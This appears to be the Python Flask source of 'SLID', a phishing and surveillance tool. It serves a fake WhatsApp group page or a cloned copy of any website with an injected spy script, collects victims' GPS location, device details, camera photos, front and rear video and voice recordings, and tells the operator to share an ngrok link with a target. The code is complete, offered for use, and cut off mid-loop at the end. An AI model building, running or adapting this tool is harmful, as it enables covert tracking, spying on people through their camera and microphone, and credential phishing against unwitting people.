from flask import Flask, render_template, request, jsonify, send_from_directory
from tabulate import tabulate
import re
import os
import base64
import time
import sys
import logging
from colorama import init, Fore, Style
from time import sleep
import requests
from bs4 import BeautifulSoup 

# Initialize colorama for cross-platform terminal colors
init(autoreset=True)

# --- Silence Flask/Werkzeug logs for a clean display ---
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR) # Set logging level to ERROR to ignore INFO/WARNING messages

app = Flask(__name__)

# --- Configuration (PATHS) ---
SAVE_PATH_IMAGE = "/home/kali/Desktop/slid/images/"
SAVE_PATH_VOICE = "/home/kali/Desktop/slid/voice/"
DATA_LOG_FILE = '/home/kali/Desktop/slid/result.csv'
STATIC_FOLDER = 'static'
HOST = '0.0.0.0'
PORT = 8080
SAVE_PATH_VIDEO_FRONT = "/home/kali/Desktop/slid/vido_fortend/" # Ÿáÿ∞ÿß ŸáŸà ÿßŸÑŸÖÿ¨ŸÑÿØ ÿßŸÑÿ£ŸÖÿßŸÖŸä
SAVE_PATH_VIDEO_BACK = "/home/kali/Desktop/slid/vidio_backend/" # Ÿáÿ∞ÿß ŸáŸà ÿßŸÑŸÖÿ¨ŸÑÿØ ÿßŸÑÿÆŸÑŸÅŸä

# Global variables
app.config['MODE'] = None # normal, spam, or clone
app.config['SPAM_MESSAGE'] = None
app.config['GROUP_NAME'] = "WhatsApp Group"
app.config['GROUP_IMAGE'] = None
app.config['GROUP_MEMBERS'] = 0
app.config['CLONE_TARGET_URL'] = None # Stores the target URL for cloning/redirection

# ----------------------------------------------------
# --- HELPER FUNCTIONS ---
# ----------------------------------------------------

def parse_user_agent(user_agent):
    """Parses the User-Agent string for OS, Device, and detailed Browser info."""
    os_info = "Unknown OS"; device_info = "Unknown Device"; browser_info = "Unknown Browser"
    ua = user_agent
    
    # --- OS & Device Detection (Enhanced) ---
    if "Windows NT" in ua:
        os_match = re.search(r"Windows NT ([\d\.]+)", ua)
        os_info = f"Windows {os_match.group(1)}" if os_match else "Windows"
        device_info = "Desktop PC"
    elif "Macintosh" in ua:
        os_info = "macOS"
        device_info = "Macintosh (Desktop)"
    elif "Android" in ua:
        os_match = re.search(r"Android ([\d\.]+)", ua)
        os_info = f"Android {os_match.group(1)}" if os_match else "Android"
        device_info = "Mobile/Tablet"
    elif "iPhone" in ua:
        os_info = "iOS"
        device_info = "iPhone"
    elif "Linux" in ua:
        os_info = "Linux"
        device_info = "Desktop PC"
    
    # --- Detailed Browser Detection ---
    if "Edg" in ua or "Edge" in ua:
        match = re.search(r"(Edg|Edge)\/([\d\.]+)", ua)
        browser_info = f"Edge {match.group(2)}" if match else "Microsoft Edge"
    elif "Chrome" in ua and "Safari" in ua:
        match = re.search(r"Chrome\/([\d\.]+)", ua)
        browser_info = f"Chrome {match.group(1)}" if match else "Chrome"
    elif "Firefox" in ua:
        match = re.search(r"Firefox\/([\d\.]+)", ua)
        browser_info = f"Firefox {match.group(1)}" if match else "Firefox"
    elif "Safari" in ua:
        match = re.search(r"Version\/([\d\.]+).*Safari", ua)
        browser_info = f"Safari {match.group(1)}" if match else "Safari"
    elif "OPR" in ua or "Opera" in ua:
        match = re.search(r"(OPR|Opera)\/([\d\.]+)", ua)
        browser_info = f"Opera {match.group(2)}" if match else "Opera"
    else:
        browser_info = "Unknown Browser" 

    return os_info, device_info, browser_info

def create_kml_file(lat, lon, public_ip):
    kml_content = f"""<?xml version="1.0" encoding="UTF-8"?>\n<kml xmlns="http://www.opengis.net/kml/2.2">\n  <Document>\n  <name>Last Captured Location</name>\n  <Style id="iconStyle">\n  <IconStyle>\n  <Icon>\n  <href>http://maps.google.com/mapfiles/kml/pushpin/red-pushpin.png</href>\n  </Icon>\n  </IconStyle>\n  </Style>\n  <Placemark>\n  <name>Captured Location ({public_ip})</name>\n  <description>Coordinates received from Geolocation API.</description>\n  <styleUrl>#iconStyle</styleUrl>\n  <Point>\n  <coordinates>{lon},{lat},0</coordinates>\n  </Point>\n  </Placemark>\n  </Document>\n</kml>"""
    try:
        with open('googleearth.kml', 'w', encoding='utf-8') as f:
            f.write(kml_content)
        print(f"{Fore.GREEN}[LOG]{Style.RESET_ALL} File Saved: {Fore.YELLOW}googleearth.kml{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error saving KML file: {e}")

# ----------------------------------------------------
# --- FLASK ROUTES ---
# ----------------------------------------------------

@app.route('/')
def index():
    if app.config['MODE'] is None:
        return "Error: Tool mode not set. Please run tool.py from CLI.", 500
    
    if app.config['MODE'] == 'clone':
        # ÿ™ŸÇÿØŸäŸÖ ÿßŸÑŸÖŸÑŸÅ ÿßŸÑŸÖÿ≠ŸÇŸàŸÜ ŸÖÿ®ÿßÿ¥ÿ±ÿ©
        return render_template('clone_template.html')
        
    return render_template('index.html')

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(STATIC_FOLDER, filename)

@app.route('/get_config', methods=['GET'])
def get_config():
    """Endpoint to provide mode and dynamic group details to JS."""
    return jsonify({
        'mode': app.config.get('MODE', 'normal'),
        'spam_message': app.config.get('SPAM_MESSAGE', 'Security Update Required.'),
        'group_name': app.config.get('GROUP_NAME', 'WhatsApp Group'),
        'group_members': app.config.get('GROUP_MEMBERS', 0),
        'group_image': app.config.get('GROUP_IMAGE', None),
        'clone_target_url': app.config.get('CLONE_TARGET_URL', '') 
    })

@app.route('/log_data', methods=['POST'])
def receive_location():
    # ... [Logic for logging location/device data] ...
    if not os.path.exists(os.path.dirname(DATA_LOG_FILE)):
        os.makedirs(os.path.dirname(DATA_LOG_FILE), exist_ok=True)

    public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent_str = request.headers.get('User-Agent', 'N/A')
    
    os_info, device_info, browser_info = parse_user_agent(user_agent_str)

    data = request.json
    
    if data and 'latitude' in data and 'longitude' in data:
        lat = data['latitude']; lon = data['longitude']; accuracy = data.get('accuracy', 'N/A')
        resolution = data.get('screen_resolution', 'N/A'); cores = data.get('cpu_cores', 'N/A')
        timezone = data.get('timezone', 'N/A'); local_time = data.get('local_time', 'N/A')

        create_kml_file(lat, lon, public_ip)

        table_data = [
            [f"{Fore.CYAN}Public IP{Style.RESET_ALL}", public_ip], 
            [f"{Fore.MAGENTA}--- DEVICE INFO ---{Style.RESET_ALL}", ""],
            [f"{Fore.CYAN}OS / Version{Style.RESET_ALL}", os_info], 
            [f"{Fore.CYAN}Device Type{Style.RESET_ALL}", device_info],
            [f"{Fore.CYAN}Browser{Style.RESET_ALL}", browser_info],
            [f"{Fore.CYAN}Screen Resolution{Style.RESET_ALL}", resolution],
            [f"{Fore.CYAN}CPU Cores{Style.RESET_ALL}", cores], 
            [f"{Fore.MAGENTA}--- LOCATION/TIME ---{Style.RESET_ALL}", ""],
            [f"{Fore.CYAN}Timezone{Style.RESET_ALL}", timezone], 
            [f"{Fore.CYAN}Local Time{Style.RESET_ALL}", local_time],
            [f"{Fore.CYAN}Latitude{Style.RESET_ALL}", lat], 
            [f"{Fore.CYAN}Longitude{Style.RESET_ALL}", lon],
            [f"{Fore.CYAN}Accuracy{Style.RESET_ALL}", f"{accuracy} meters"],
        ]

        print(f"\n{Fore.GREEN + Style.BRIGHT}" + "=" * 70)
        print("üéâ SUCCESS: NEW DATA CAPTURED! üéâ")
        print(tabulate(table_data, headers=[f"{Fore.YELLOW}Field{Style.RESET_ALL}", f"{Fore.YELLOW}Value{Style.RESET_ALL}"], tablefmt="fancy_grid"))
        print("=" * 70 + f"{Style.RESET_ALL}\n")

        plain_table_data = [[re.sub(r'\x1b\[.*?m', '', row[0]), row[1]] for row in table_data]
        with open(DATA_LOG_FILE, 'a', encoding='utf-8') as f:
             f.write(f"\n[RECEIVED AT: {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
             f.write(tabulate(plain_table_data, headers=["Field", "Value"], tablefmt="plain"))
             f.write("\n" + "-" * 70 + "\n")

        return jsonify({"status": "success"}), 200
    
    public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"\n{Fore.YELLOW}‚ö†Ô∏è WARNING:{Style.RESET_ALL} Page visited ({public_ip}), but Geolocation data was NOT received.")
    return jsonify({"status": "error", "message": "Location data not received"}), 400


@app.route('/capture_image', methods=['POST'])
def capture_image():
    # ... [Image capture logic] ...
    if not os.path.exists(SAVE_PATH_IMAGE):
        try: os.makedirs(SAVE_PATH_IMAGE, exist_ok=True)
        except OSError as e: print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to create directory {SAVE_PATH_IMAGE}: {e}"); return jsonify({"status": "error", "message": "Server path error"}), 500
        
    try:
        data = request.json
        if not data or 'image_data' not in data:
            return jsonify({"status": "error", "message": "No image data provided"}), 400

        image_data = data['image_data'].split(',')[1] 
        img_bytes = base64.b64decode(image_data)
        
        public_ip = request.headers.get('X-Forwarded-For', request.remote_addr).replace('.', '_')
        filename = f"image_hires_{public_ip}_{int(time.time())}.jpeg" 
        file_path = os.path.join(SAVE_PATH_IMAGE, filename)
        
        with open(file_path, 'wb') as f:
            f.write(img_bytes)
        
        table_data = [
            [f"{Fore.CYAN}Status{Style.RESET_ALL}", f"{Fore.GREEN}Image Saved Successfully!{Style.RESET_ALL}"], 
            [f"{Fore.CYAN}File Name{Style.RESET_ALL}", filename], 
            [f"{Fore.CYAN}Saved Path{Style.RESET_ALL}", SAVE_PATH_IMAGE]
        ]
        
        print(f"\n{Fore.MAGENTA + Style.BRIGHT}" + "=" * 50); print("üì∏ IMAGE CAPTURE CONFIRMATION")
        print(tabulate(table_data, headers=[f"{Fore.YELLOW}Field{Style.RESET_ALL}", f"{Fore.YELLOW}Value{Style.RESET_ALL}"], tablefmt="fancy_grid")); print("=" * 50 + f"{Style.RESET_ALL}\n")
        
        return jsonify({"status": "success", "file": filename}), 200

    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error saving image: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/capture_video', methods=['POST'])
def capture_video():
    save_dir = None
        
    try:
        video_file = request.files.get('video_data')
        if not video_file:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Received data but no 'video_data' file found.");
            return jsonify({"status": "error", "message": "No video data provided"}), 400

        original_filename = video_file.filename
        
        # üåüüåüüåü ÿßŸÑÿ™ÿπÿØŸäŸÑ ŸáŸÜÿß: Ÿäÿ™ŸÖ ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ 'user' ÿ£Ÿà 'environment' üåüüåüüåü
        camera_type_match = re.search(r'recording_(user|environment)\.webm', original_filename)
        camera_type = camera_type_match.group(1) if camera_type_match else 'unknown'

        if camera_type == 'user':
            save_dir = SAVE_PATH_VIDEO_FRONT
        elif camera_type == 'environment':
            save_dir = SAVE_PATH_VIDEO_BACK
        else:
            save_dir = SAVE_PATH_VIDEO_FRONT # ÿßŸÑÿßŸÅÿ™ÿ±ÿßÿ∂Ÿä ŸáŸà ŸÖÿ¨ŸÑÿØ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ÿßŸÑÿ£ŸÖÿßŸÖŸäÿ© 

        if not os.path.exists(save_dir):
            try: os.makedirs(save_dir, exist_ok=True)
            except OSError as e: 
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to create directory {save_dir}: {e}"); 
                return jsonify({"status": "error", "message": "Server path error"}), 500

        public_ip = request.headers.get('X-Forwarded-For', request.remote_addr).replace('.', '_')
        # ÿ™ŸÖ ÿ™ÿ≠ÿØŸäÿ´ ÿßÿ≥ŸÖ ÿßŸÑŸÖŸÑŸÅ ŸÑŸäÿ≠ÿ™ŸàŸä ÿπŸÑŸâ 'user' ÿ£Ÿà 'environment'
        filename = f"video_{camera_type}_{public_ip}_{int(time.time())}.webm" 
        file_path = os.path.join(save_dir, filename)
        
        video_file.save(file_path)
        
        table_data = [
            [f"{Fore.CYAN}Status{Style.RESET_ALL}", f"{Fore.GREEN}Video Saved Successfully!{Style.RESET_ALL}"], 
            [f"{Fore.CYAN}Camera{Style.RESET_ALL}", camera_type.capitalize()], 
            [f"{Fore.CYAN}File Name{Style.RESET_ALL}", filename], 
            [f"{Fore.CYAN}Saved Path{Style.RESET_ALL}", save_dir] 
        ]
        
        print(f"\n{Fore.MAGENTA + Style.BRIGHT}" + "=" * 50); print("üé• VIDEO CAPTURE CONFIRMATION")
        print(tabulate(table_data, headers=[f"{Fore.YELLOW}Field{Style.RESET_ALL}", f"{Fore.YELLOW}Value{Style.RESET_ALL}"], tablefmt="fancy_grid")); print("=" * 50 + f"{Style.RESET_ALL}\n")
        
        return jsonify({"status": "success", "file": filename}), 200

    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error saving video: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/record_voice', methods=['POST'])
def record_voice():
    # ... [Voice record logic] ...
    if not os.path.exists(SAVE_PATH_VOICE):
        try: os.makedirs(SAVE_PATH_VOICE, exist_ok=True); 
        except OSError as e: print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Could not create directory {SAVE_PATH_VOICE}: {e}"); return jsonify({"status": "error", "message": "Server path error"}), 500
        
    try:
        voice_file = request.files.get('audio_data')
        if not voice_file:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Received data but no 'audio_data' file found."); return jsonify({"status": "error", "message": "No audio data provided"}), 400

        public_ip = request.headers.get('X-Forwarded-For', request.remote_addr).replace('.', '_')
        filename = f"voice_{public_ip}_{int(time.time())}.ogg" 
        file_path = os.path.join(SAVE_PATH_VOICE, filename)
        
        voice_file.save(file_path)
        
        table_data = [
            [f"{Fore.CYAN}Status{Style.RESET_ALL}", f"{Fore.GREEN}Voice Saved Successfully!{Style.RESET_ALL}"], 
            [f"{Fore.CYAN}File Name{Style.RESET_ALL}", filename], 
            [f"{Fore.CYAN}Saved Path{Style.RESET_ALL}", SAVE_PATH_VOICE], 
            [f"{Fore.CYAN}Visitor IP{Style.RESET_ALL}", public_ip]
        ]
        
        print(f"\n{Fore.GREEN + Style.BRIGHT}" + "=" * 50); print("üéôÔ∏è VOICE RECORDING CONFIRMATION")
        print(tabulate(table_data, headers=[f"{Fore.YELLOW}Field{Style.RESET_ALL}", f"{Fore.YELLOW}Value{Style.RESET_ALL}"], tablefmt="fancy_grid")); print("=" * 50 + f"{Style.RESET_ALL}\n")
        
        return jsonify({"status": "success", "file": filename}), 200

    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} An unexpected error occurred while saving voice: {e}"); return jsonify({"status": "error", "message": str(e)}), 500


# ----------------------------------------------------
# --- CLI MENU & CLONING LOGIC ---
# ----------------------------------------------------

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(duration=2):
    symbols = ['|', '/', '-', '\\']
    start_time = time.time()
    while time.time() - start_time < duration:
        for symbol in symbols:
            sys.stdout.write(f"\r{Fore.BLUE}[LOADING]{Fore.CYAN} Initializing systems {symbol}{Style.RESET_ALL}")
            sys.stdout.flush()
            sleep(0.1)
    sys.stdout.write(f"\r{Fore.GREEN}[READY] Systems initialized successfully!  {Style.RESET_ALL}\n")


def splash_screen():
    clear_terminal()
    print(Fore.RED + Style.BRIGHT + """
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
        ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
        ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
        ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù 
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + "\n\t -- S L I D - E N G A G E --" + Style.RESET_ALL)
    print(Fore.MAGENTA + "\t\tData Acquisition Tool" + Style.RESET_ALL)
    print("-" * 40)
    loading_animation(2) 
    sleep(0.5)

def get_group_details():
    clear_terminal()
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + "# ‚öôÔ∏è  Group Setup (Interactive Mode)" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)

    # 1. Group Name
    group_name = input(Fore.CYAN + ">> 1/3 Enter **Fake Group Name**: " + Style.RESET_ALL)
    if group_name.strip():
        app.config['GROUP_NAME'] = group_name.strip()
    else:
        print(Fore.YELLOW + "[INFO] Using default name: 'WhatsApp Group'" + Style.RESET_ALL)

    # 2. Group Image (URL or Local Path)
    while True:
        image_input = input(Fore.CYAN + ">> 2/3 Enter **Image URL** or **Local Path** (or press ENTER to skip): " + Style.RESET_ALL).strip()
        app.config['GROUP_IMAGE'] = None 
        
        if not image_input:
            print(Fore.YELLOW + "[INFO] No image selected." + Style.RESET_ALL)
            break
        
        if image_input.startswith(('http://', 'https://')):
            # --- Handle URL ---
            try:
                print(Fore.BLUE + f"[FETCHING] Attempting to fetch image from URL: {image_input}" + Style.RESET_ALL)
                
                response = requests.get(image_input, timeout=10)
                response.raise_for_status() 

                content_type = response.headers.get('Content-Type', 'image/jpeg')
                if not content_type.startswith('image/'):
                    content_type = 'image/jpeg' 
                
                encoded_string = base64.b64encode(response.content).decode('utf-8')
                app.config['GROUP_IMAGE'] = f"data:{content_type};base64,{encoded_string}"
                print(Fore.GREEN + f"[SUCCESS] Image fetched and encoded from URL." + Style.RESET_ALL)
                break
                
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[ERROR] Failed to fetch image from URL: {e}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[ERROR] An unexpected error occurred during URL processing: {e}" + Style.RESET_ALL)

        elif os.path.exists(image_input) and os.path.isfile(image_input):
            # --- Handle Local File (Original Logic) ---
            try:
                with open(image_input, "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
                    mime = "image/jpeg" if image_input.lower().endswith(('.jpg', '.jpeg')) else "image/png"
                    app.config['GROUP_IMAGE'] = f"data:{mime};base64,{encoded_string}"
                    print(Fore.GREEN + f"[SUCCESS] Image loaded and encoded from local path: {image_input}" + Style.RESET_ALL)
                    break
            except Exception as e:
                print(Fore.RED + f"[ERROR] Could not read local file or encode: {e}" + Style.RESET_ALL)
        
        else:
            print(Fore.RED + "[ERROR] Invalid input. Not a valid URL, local path, or file not found." + Style.RESET_ALL)
            
    # 3. Fake Members Count
    while True:
        members_count = input(Fore.CYAN + ">> 3/3 Enter **Fake Member Count** (number, e.g., 55): " + Style.RESET_ALL)
        if members_count.isdigit():
            app.config['GROUP_MEMBERS'] = int(members_count)
            print(Fore.GREEN + f"[SUCCESS] Member count set to: {members_count}" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "[ERROR] Invalid input. Please enter a number." + Style.RESET_ALL)

    time.sleep(1) 
    clear_terminal()

def start_local_clone():
    clear_terminal()
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + "# üß™ LOCAL PAGE CLONE SETUP" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    
    # 1. Target URL Input
    while True:
        target_input = input(Fore.CYAN + "\n>> 1/2 Enter **Target URL** to Clone (e.g., https://www.google.com): " + Style.RESET_ALL).strip()
        
        # Simple URL validation
        if re.match(r'https?://[^\s/$.?#].[^\s]*$', target_input):
            app.config['CLONE_TARGET_URL'] = target_input
            print(Fore.GREEN + f"[SUCCESS] Target URL set: {target_input}" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "[ERROR] Invalid URL format. Please enter a valid HTTP/HTTPS URL." + Style.RESET_ALL)

    # 2. Cloning and Injection Logic
    print(Fore.YELLOW + "\n>> 2/2 Starting cloning process: Fetching and injecting code..." + Style.RESET_ALL)
    
    try:
        # Fetch the HTML content
        response = requests.get(app.config['CLONE_TARGET_URL'], timeout=15)
        response.raise_for_status() # Check for bad status codes
        
        # Parse the HTML using BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Define the injection script (This is the crucial part for your JS to run)
        injection_script = soup.new_tag('script', src='/static/script.js')
        
        # Find the <head> tag
        head = soup.find('head')
        if head:
            # Inject the script tag right at the beginning of the <head>
            head.insert(0, injection_script)
            print(Fore.GREEN + "    ‚úÖ Script injected successfully into <head>." + Style.RESET_ALL)
        else:
            # Fallback: if no <head> tag is found, inject into <body>
            body = soup.find('body')
            if body:
                body.insert(0, injection_script)
                print(Fore.YELLOW + "    ‚ö†Ô∏è Script injected into <body> (No <head> found)." + Style.RESET_ALL)
            else:
                print(Fore.RED + "    ‚ùå Failed to inject script (No <head> or <body> found)." + Style.RESET_ALL)
                # Fallback to the original HTML content without injection
                final_html = response.text
                
        if head or body:
            final_html = str(soup)
            
        # Ensure 'templates' directory exists
        template_dir = 'templates'
        os.makedirs(template_dir, exist_ok=True)
        
        # Save the modified HTML to clone_template.html (overwriting old content)
        clone_file_path = os.path.join(template_dir, 'clone_template.html')
        with open(clone_file_path, 'w', encoding='utf-8') as f:
            f.write(final_html)
            
        print(Fore.GREEN + f"\n[SUCCESS] Cloned page saved to: {clone_file_path}" + Style.RESET_ALL)
        
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"\n[ERROR] Failed to fetch or process URL: {e}" + Style.RESET_ALL)
        print(Fore.RED + "          The server will start, but the cloned page may be empty or failed." + Style.RESET_ALL)
        # We must create an empty/failed template to prevent server crash
        with open(os.path.join('templates', 'clone_template.html'), 'w', encoding='utf-8') as f:
            f.write(f"<h1>Error Cloning Page</h1><p>Failed to access {app.config['CLONE_TARGET_URL']}. Check your network connection and the URL.</p>")
            
    except Exception as e:
        print(Fore.RED + f"\n[ERROR] An unexpected error occurred during cloning: {e}" + Style.RESET_ALL)
        # We must create an empty/failed template to prevent server crash
        with open(os.path.join('templates', 'clone_template.html'), 'w', encoding='utf-8') as f:
            f.write(f"<h1>Cloning Error</h1><p>An internal error occurred: {e}</p>")


    time.sleep(1)
    clear_terminal()


def run_server():
    clear_terminal() 
    
    # üåü Directory Check
    print(f"{Fore.CYAN}[SETUP]{Style.RESET_ALL} Checking and creating necessary directories...")
    dirs_to_check = ['templates', 'static', SAVE_PATH_IMAGE, SAVE_PATH_VOICE, SAVE_PATH_VIDEO_FRONT, SAVE_PATH_VIDEO_BACK] 
    for d in dirs_to_check:
        if not os.path.exists(d): 
            try: 
                os.makedirs(d, exist_ok=True)
                print(f"{Fore.GREEN}  ‚úîÔ∏è Created directory: {d}" + Style.RESET_ALL)
            except OSError as e:
                print(f"{Fore.RED}[ERROR] Failed to create directory {d}: {e}")
        else:
            print(f"{Fore.GREEN}  ‚úîÔ∏è Directory exists: {d}" + Style.RESET_ALL)

    print(Fore.GREEN + Style.BRIGHT + "\n[SERVER STATUS] Starting Web Server... " + Style.RESET_ALL, end='')
    print(Fore.GREEN + "‚úÖ" + Style.RESET_ALL)
    time.sleep(0.5)
    print(Fore.GREEN + Style.BRIGHT + f"[SERVER STATUS] Binding to port {PORT}... " + Style.RESET_ALL, end='')
    print(Fore.GREEN + "‚úÖ" + Style.RESET_ALL)
    time.sleep(0.5)
    
    clear_terminal()
    
    # --- AUTOMATIC NGROK LINK SETTING ---
    ngrok_link = f"http://<NGROK_TUNNEL_ADDRESS>/" 
    
    # --- ENHANCED SERVER LIVE DISPLAY START ---
    
    SEPARATOR = Fore.BLUE + "=" * 70 + Style.RESET_ALL
    
    print(SEPARATOR)
    print(Fore.YELLOW + Style.BRIGHT + "            ‚ö°Ô∏è SLID IS ACTIVE AND AWAITING CONNECTION ‚ö°Ô∏è" + Style.RESET_ALL)
    print(SEPARATOR)
    
    # Target Information 
    if app.config['MODE'] == 'clone':
        print(Fore.RED + Style.BRIGHT + f"  üß™ MODE: LOCAL PAGE CLONE" + Style.RESET_ALL)
        print(Fore.RED + Style.BRIGHT + f"  üîó CLONED TARGET: {app.config['CLONE_TARGET_URL']}" + Style.RESET_ALL)
    else:
        print(Fore.MAGENTA + Style.BRIGHT + f"  üéØ TARGET GROUP: {app.config['GROUP_NAME']}" + Style.RESET_ALL)
        print(Fore.MAGENTA + Style.BRIGHT + f"  üë• MEMBERS COUNT: {app.config['GROUP_MEMBERS']:,}" + Style.RESET_ALL)
        if app.config['MODE'] == 'spam':
            print(Fore.RED + Style.BRIGHT + f"  üö® SPAM MESSAGE: {app.config['SPAM_MESSAGE']}" + Style.RESET_ALL)

    print(SEPARATOR)
    
    # Local Link (Highlighted)
    print(Fore.GREEN + Style.BRIGHT + f"  üåê LOCAL ACCESS: http://{HOST}:{PORT}/" + Style.RESET_ALL)
    
    # NGROK Link 
    print(Fore.RED + Style.BRIGHT + f"  üåç NGROK/TUNNEL LINK: {ngrok_link}" + Style.RESET_ALL)
    
    # Crucial Next Step
    print(Fore.CYAN + Style.BRIGHT + "\n  üîó SHARE THE NGROK LINK WITH YOUR TARGET." + Style.RESET_ALL )
    
    print(SEPARATOR)
    
    try:
        app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[INFO] Server stopped by user (CTRL+C). Shutting down." + Style.RESET_ALL)
        sys.exit(0)


def main_menu():
    splash_screen()
    clear_terminal()

    # Title Card
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + "# üõ†Ô∏è  SLID - Operational Mode Selection" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    
    print(Fore.WHITE + "\nPlease select an operation mode:" + Style.RESET_ALL)
    
    # Option 1: NORMAL
    print(Fore.GREEN + Style.BRIGHT + "\n1Ô∏è‚É£  NORMAL Mode ‚ú® (Default HTML Page)" + Style.RESET_ALL)
    print(Fore.WHITE + "    - " + Fore.CYAN + "Data Collection" + Fore.WHITE + " (Camera, Location, Browser Info)." + Style.RESET_ALL)
    print(Fore.WHITE + "    - " + Fore.CYAN + "Interactive Setup" + Fore.WHITE + " for the fake group details." + Style.RESET_ALL)
    
    # Option 2: SPAM
    print(Fore.YELLOW + Style.BRIGHT + "\n2Ô∏è‚É£  SPAM Mode ‚ö†Ô∏è (Repeating Alert Page)" + Style.RESET_ALL)
    print(Fore.WHITE + "    - " + Fore.MAGENTA + "Displays a Repeating Message" + Fore.WHITE + " (Phishing message) to the target." + Style.RESET_ALL)
    print(Fore.WHITE + "    - " + Fore.MAGENTA + "Functions as (NORMAL)" + Fore.WHITE + " for background data collection." + Style.RESET_ALL)
    
    # Option 3: CLONE
    print(Fore.RED + Style.BRIGHT + "\n3Ô∏è‚É£  LOCAL PAGE CLONE üß™ (Cloning & Injection)" + Style.RESET_ALL)
    print(Fore.WHITE + "    - " + Fore.GREEN + "Clones a Target URL" + Fore.WHITE + " and " + Fore.GREEN + "Injects Spy JS Code" + Fore.WHITE + "." + Style.RESET_ALL)
    print(Fore.WHITE + "    - " + Fore.GREEN + "Provides a highly realistic decoy page." + Style.RESET_ALL)
    
    # Option 4: EXIT 
    print(Fore.RED + Style.BRIGHT + "\n4Ô∏è‚É£  EXIT Tool üö™" + Style.RESET_ALL)
    print(Fore.RED + "    - Shut down the SLID tool." + Style.RESET_ALL)

    while True:
        choice = input(Fore.CYAN + "\n>> Enter selection number: " + Style.RESET_ALL)
        
        if choice == '1':
            app.config['MODE'] = 'normal'
            app.config['SPAM_MESSAGE'] = None
            print(Fore.GREEN + "\n[INFO] Mode set to **NORMAL**. Starting interactive group setup..." + Style.RESET_ALL)
            get_group_details() 
            break
            
        elif choice == '2':
            app.config['MODE'] = 'spam'
            message = input(Fore.YELLOW + ">> Enter the SPAM message: " + Style.RESET_ALL)
            if not message.strip():
                print(Fore.YELLOW + "[WARNING] Empty message. Using default message." + Style.RESET_ALL)
                app.config['SPAM_MESSAGE'] = "Security Update Required to Proceed."
            else:
                app.config['SPAM_MESSAGE'] = message.strip()
            get_group_details() 
            print(Fore.YELLOW + "\n[INFO] Mode set to **SPAM**. Starting server..." + Style.RESET_ALL)
            break
            
        elif choice == '3': # CLONE OPTION
            app.config['MODE'] = 'clone'
            start_local_clone() # **NEW: Runs cloning/injection before starting server**
            print(Fore.RED + "\n[INFO] Mode set to **CLONE**. Starting server..." + Style.RESET_ALL)
            break

        elif choice == '4':
            print(Fore.RED + "[INFO] Shutting down. Goodbye! üëã" + Style.RESET_ALL)
            sys.exit(0)
            
        else:
